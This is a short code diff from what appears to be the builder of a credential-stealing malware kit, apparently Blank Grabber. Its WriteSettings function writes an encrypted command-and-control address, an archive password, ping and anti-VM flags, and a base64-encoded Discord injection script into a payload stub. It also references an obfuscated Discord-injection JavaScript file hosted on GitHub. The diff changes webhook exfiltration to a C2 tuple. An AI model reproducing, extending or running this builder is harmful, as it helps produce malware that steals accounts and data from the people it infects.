@@ -15,7 +15,7 @@ OutCodeFile = "stub-o.py"
 InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js"
 
 def WriteSettings(code: str, settings: dict, injection: str) -> str:
-    code = code.replace('"%webhook%"', EncryptString(settings["settings"]["webhook"]))
+    code = code.replace('"%c2%"', "(%d, %s)" % (settings["settings"]["c2"][0], EncryptString(settings["settings"]["c2"][1])))
     code = code.replace('"%archivepassword%"', EncryptString(settings["settings"]["archivePassword"]))
     code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
     code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
@@ -47,12 +47,13 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
 
     if injection is not None:
         code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
-    
-    if settings["settings"]["consoleMode"] == 0:
-        open("noconsole", "w").close()
-    else:
-        if os.path.isfile("noconsole"):
-            os.remove("noconsole")
+
+    if __name__ == "__main__":
+        if settings["settings"]["consoleMode"] == 0:
+            open("noconsole", "w").close()
+        else:
+            if os.path.isfile("noconsole"):
+                os.remove("noconsole")
     
     return code
 
